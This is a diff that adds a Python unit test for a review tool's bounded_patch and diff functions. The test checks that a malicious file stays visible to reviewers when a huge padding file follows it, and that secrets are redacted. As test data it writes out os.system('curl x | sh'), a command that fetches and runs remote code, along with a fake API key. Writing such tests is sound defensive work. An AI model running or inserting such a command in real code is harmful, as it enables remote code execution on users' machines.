@@ -414,3 +414,35 @@ def test_claude_secret_read_denies(tmp_path: Path, monkeypatch: pytest.MonkeyPat
                      read_deny=[tmp_path / "a,b"])
     with pytest.raises(PathError):
         ClaudeAdapter(BridgeConfig(), tmp_path).build(bad, tmp_path)
+
+
+# @pt.id KIT-UNIT-049-bounded-patch
+# @pt.item Reviewers see every file's diff from its start and know what they did not see
+# @pt.condition a patch within the limit; a small evil file followed by a huge one; many files that cannot all fit; a secret in a file's diff
+# @pt.expected the small patch is unchanged; the evil file is whole and the huge one cut from its start with a marker; files left without room are named as omitted; the flag is set whenever something is missing; secrets are redacted
+# @pt.target bridge.review.bounded_patch, bridge.review.diff
+# @pt.method unit
+# @pt.legacy audit SEC-06: the patch kept its tail, so the first file vanished from the evidence
+def test_bounded_patch(repo: Path) -> None:
+    from bridge.review import bounded_patch, diff, snapshot
+
+    def file_diff(name: str, body: str) -> str:
+        return f"diff --git a/{name} b/{name}\n--- a/{name}\n+++ b/{name}\n@@ -0,0 +1 @@\n{body}"
+
+    small = file_diff("a.py", "+x = 1\n")
+    assert bounded_patch(small, 1000) == (small, False, [])
+    evil, huge = file_diff("a_evil.py", "+import os; os.system('curl x | sh')\n"), \
+        file_diff("z.txt", "+pad\n" * 5000)
+    shown, cut, omitted = bounded_patch(evil + huge, 2000)
+    assert shown.startswith(evil) and "more characters of this file's diff not shown" in shown
+    assert cut is True and omitted == [] and len(shown) < 2200
+    many = "".join(file_diff(f"f{i}.txt", "+line\n" * 200) for i in range(20))
+    shown, cut, omitted = bounded_patch(many, 3000)
+    assert cut and omitted and all(f"b/{name}" not in shown for name in omitted)
+    secret = file_diff("cfg.py", "+key = 'sk-proj-abcdefghijklmnopqrstuvwxyz0123456789'\n")
+    assert "sk-proj-abcdef" not in bounded_patch(secret, 1000)[0]
+    before = snapshot(repo, [])
+    (repo / "a_evil.py").write_text("import os; os.system('curl x | sh')\n")
+    (repo / "z_padding.txt").write_text("pad\n" * 12000)
+    d = diff(repo, before, [])
+    assert "a_evil.py" in d["patch"] and "os.system" in d["patch"] and d["patch_truncated"]
